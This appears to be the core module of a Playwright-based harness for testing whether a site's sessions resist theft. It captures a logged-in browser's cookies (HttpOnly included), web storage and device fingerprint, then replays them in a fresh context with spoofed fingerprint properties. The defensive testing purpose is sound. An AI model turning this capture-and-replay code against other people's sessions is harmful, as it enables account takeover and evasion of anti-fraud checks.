// attacks.mjs
// ─────────────────────────────────────────────────────────────────────────
// The auditable core of the Relock harness.
//
// Everything that touches your session lives in this one file, in plain
// Playwright. Read it before you run it. There is no hidden behaviour:
//   • capture() reads the session material a logged-in browser holds.
//   • replay()  loads that material into a separate, fresh browser and
//               navigates to the target as an attacker would.
// ─────────────────────────────────────────────────────────────────────────

export const TIERS = {
  T1: {
    id: 'T1', name: 'Cookie Replay',
    captures: ['cookies'],
    blurb: 'Copies the entire cookie store. Pass-the-cookie — the simplest theft.',
  },
  T2: {
    id: 'T2', name: 'Session Hijack',
    captures: ['cookies', 'storage'],
    blurb: 'Copies every cookie + localStorage + sessionStorage — the full set of data modern infostealers pull off a compromised machine.',
  },
  T3: {
    id: 'T3', name: 'Identity Impersonation',
    captures: ['cookies', 'storage', 'fingerprint'],
    blurb: 'Everything in T2, plus your device fingerprint — the IMPaaS technique that can defeat advanced risk-based and anti-fraud checks.',
  },
};

// ── CAPTURE ────────────────────────────────────────────────────────────────
// Runs against the victim context you just logged into.
export async function capture(victimPage, victimContext, tier) {
  const t = TIERS[tier];
  const loot = { tier, cookies: [], localStorage: {}, sessionStorage: {}, fingerprint: null };

  // Cookies are read from the cookie STORE — this includes HttpOnly cookies,
  // exactly like disk-level malware, and unlike anything document.cookie can see.
  // Scoped to the origin the user logged into, so we don't sweep unrelated cookies.
  loot.cookies = await victimContext.cookies(victimPage.url());

  if (t.captures.includes('storage')) {
    const dumped = await victimPage.evaluate(() => {
      const dump = (store) => {
        const out = {};
        for (let i = 0; i < store.length; i++) {
          const k = store.key(i);
          out[k] = store.getItem(k);
        }
        return out;
      };
      return { ls: dump(window.localStorage), ss: dump(window.sessionStorage) };
    });
    loot.localStorage = dumped.ls;
    loot.sessionStorage = dumped.ss;
  }

  if (t.captures.includes('fingerprint')) {
    loot.fingerprint = await victimPage.evaluate(() => {
      let webgl = null;
      try {
        const gl = document.createElement('canvas').getContext('webgl');
        const dbg = gl.getExtension('WEBGL_debug_renderer_info');
        webgl = {
          vendor: gl.getParameter(dbg.UNMASKED_VENDOR_WEBGL),
          renderer: gl.getParameter(dbg.UNMASKED_RENDERER_WEBGL),
        };
      } catch (e) { /* WebGL unavailable — leave null */ }
      return {
        userAgent: navigator.userAgent,
        platform: navigator.platform,
        languages: navigator.languages,
        hardwareConcurrency: navigator.hardwareConcurrency,
        deviceMemory: navigator.deviceMemory || null,
        screen: { width: screen.width, height: screen.height, colorDepth: screen.colorDepth },
        devicePixelRatio: window.devicePixelRatio,
        timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
        webgl,
      };
    });
  }

  return loot;
}

// A short, human-readable summary of what was taken (for the terminal).
// Only states what the code can actually derive: counts, the HttpOnly count,
// and a shape-based JWT guess. It deliberately does NOT claim to know which
// cookie is "the session cookie" — there's no reliable way to tell.
const looksLikeJwt = (v) =>
  typeof v === 'string' && /^[A-Za-z0-9_-]+\.[A-Za-z0-9_-]+\.[A-Za-z0-9_-]+$/.test(v);

export function summarize(loot) {
  const lines = [];
  const plural = (n, word) => `${n} ${word}${n === 1 ? '' : 's'}`;
  const httpOnly = loot.cookies.filter((c) => c.httpOnly).length;
  let cookieLine = plural(loot.cookies.length, 'cookie') + (httpOnly ? `  (${httpOnly} HttpOnly)` : '');
  if (loot.tier === 'T1') cookieLine += '  — the whole cookie store';
  lines.push(cookieLine);
  if (loot.tier !== 'T1') {
    const jwtCount = Object.values(loot.localStorage).filter(looksLikeJwt).length;
    lines.push(`localStorage   ${plural(Object.keys(loot.localStorage).length, 'key')}` +
      (jwtCount ? `  (${jwtCount} ${jwtCount === 1 ? 'value looks' : 'values look'} like a JWT)` : ''));
    lines.push(`sessionStorage ${plural(Object.keys(loot.sessionStorage).length, 'key')}`);
  }
  if (loot.fingerprint) {
    const f = loot.fingerprint;
    lines.push(`fingerprint    UA · screen ${f.screen.width}x${f.screen.height} · ${f.timezone}` +
      (f.webgl ? ` · WebGL ${f.webgl.renderer}` : '') + '  → reproduced');
  }
  return lines;
}

// Strip query and fragment so we never display or record a URL that might
// carry a token (some apps put access tokens in ?query or #fragment).
const safeUrl = (u) => {
  try { const x = new URL(u); return x.origin + x.pathname; }
  catch { return '[unparseable-url]'; }
};

// ── REPLAY ───────────────────────────────────────────────────────────────
// Builds a FRESH context (a separate "device" with none of the victim's
// material), injects the loot, and navigates to the target. Returns the
// attacker page for inspection.
export async function replay(browser, target, loot) {
  const origin = new URL(target).origin;
  const fp = loot.fingerprint;

  const contextOpts = {};
  if (fp) {
    contextOpts.userAgent = fp.userAgent;
    if (fp.languages && fp.languages[0]) contextOpts.locale = fp.languages[0];
    if (fp.timezone) contextOpts.timezoneId = fp.timezone;
    if (fp.screen) {
      contextOpts.screen = { width: fp.screen.width, height: fp.screen.height };
      contextOpts.viewport = { width: fp.screen.width, height: Math.max(360, fp.screen.height - 120) };
    }
    if (fp.devicePixelRatio) contextOpts.deviceScaleFactor = fp.devicePixelRatio;
  }

  const attacker = await browser.newContext(contextOpts);

  // T3: spoof the fingerprint signals that aren't context options, before any
  // page script runs, so the attacker context matches the captured fingerprint.
  if (fp) {
    await attacker.addInitScript((f) => {
      const def = (obj, prop, val) => { try { Object.defineProperty(obj, prop, { get: () => val }); } catch (e) {} };
      def(navigator, 'platform', f.platform);
      def(navigator, 'hardwareConcurrency', f.hardwareConcurrency);
      if (f.deviceMemory != null) def(navigator, 'deviceMemory', f.deviceMemory);
      if (f.languages) def(navigator, 'languages', f.languages);
      if (f.webgl) {
        const orig = WebGLRenderingContext.prototype.getParameter;
        WebGLRenderingContext.prototype.getParameter = function (p) {
          if (p === 37445) return f.webgl.vendor;   // UNMASKED_VENDOR_WEBGL
          if (p === 37446) return f.webgl.renderer; // UNMASKED_RENDERER_WEBGL
          return orig.call(this, p);
        };
      }
    }, fp);
  }

  // Inject the stolen cookies (HttpOnly included — addCookies restores them).
  if (loot.cookies && loot.cookies.length) {
    await attacker.addCookies(loot.cookies);
  }

  const page = await attacker.newPage();

  // Seed localStorage / sessionStorage on the origin, then load the target.
  const hasStorage =
    Object.keys(loot.localStorage || {}).length || Object.keys(loot.sessionStorage || {}).length;
  if (hasStorage) {
    await page.goto(origin, { waitUntil: 'domcontentloaded' }).catch(() => {});
    await page.evaluate(({ ls, ss }) => {
      for (const [k, v] of Object.entries(ls || {})) localStorage.setItem(k, v);
      for (const [k, v] of Object.entries(ss || {})) sessionStorage.setItem(k, v);
    }, { ls: loot.localStorage, ss: loot.sessionStorage });
  }

  await page.goto(target, { waitUntil: 'domcontentloaded' }).catch(() => {});

  const rawUrl = page.url();
  const finalUrl = safeUrl(rawUrl); // origin + path only — never persist query/fragment
  const looksLikeLogin = /login|sign-?in|auth(enticate)?/i.test(rawUrl);

  return { attacker, page, finalUrl, looksLikeLogin };
}
